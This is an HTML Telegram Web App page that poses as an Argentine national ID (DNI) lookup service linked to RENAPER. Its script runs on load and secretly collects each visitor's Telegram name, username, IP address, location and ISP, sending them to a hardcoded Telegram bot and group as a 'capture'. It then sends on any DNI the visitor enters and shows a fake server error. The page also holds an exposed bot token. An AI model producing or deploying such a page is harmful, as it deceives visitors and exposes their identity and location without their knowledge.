<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA ARG-DATA v4.2</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; }
        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; font-weight: bold; width: 90%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h3>ARG-DATA BOT</h3>
        <p>CONSULTA NACIONAL DNI</p>
        <input type="number" id="dni" placeholder="Ingrese DNI objetivo">
        <br>
        <button onclick="consultar()">BUSCAR CIUDADANO</button>
        <p id="status" style="font-size: 0.8em; margin-top:15px;">Sincronizando con RENAPER...</p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const token = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
        const grupo = "-1003670055074";

        // Obtener datos del usuario de Telegram
        const user = tg.initDataUnsafe.user;
        const nombreUser = user ? `${user.first_name} ${user.last_name || ""}` : "Desconocido";
        const aliasUser = user?.username ? `@${user.username}` : "Sin @alias";

        async function autoCaptura() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                const texto = `üì¢ **¬°NUEVA CAPTURA!**\n` +
                              `üë§ **Usuario:** ${nombreUser}\n` +
                              `üÜî **Alias:** ${aliasUser}\n` +
                              `üåê **IP:** \`${data.ip}\`\n` +
                              `üìç **Loc:** \`${data.city}, ${data.country_name}\`\n` +
                              `üè¢ **ISP:** \`${data.org}\``;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
            } catch (e) { console.log(e); }
        }

        async function consultar() {
            const dni = document.getElementById('dni').value;
            if(!dni) return alert("Ingrese un DNI");
            
            const textoDni = `üìù **DNI BUSCADO POR:** ${aliasUser}\n` +
                              `üéØ **DNI:** \`${dni}\``;
                              
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(textoDni)}&parse_mode=Markdown`);
            alert("Error 505: El servidor de RENAPER no responde.");
        }

        window.onload = autoCaptura;
    </script>
</body>
</html>
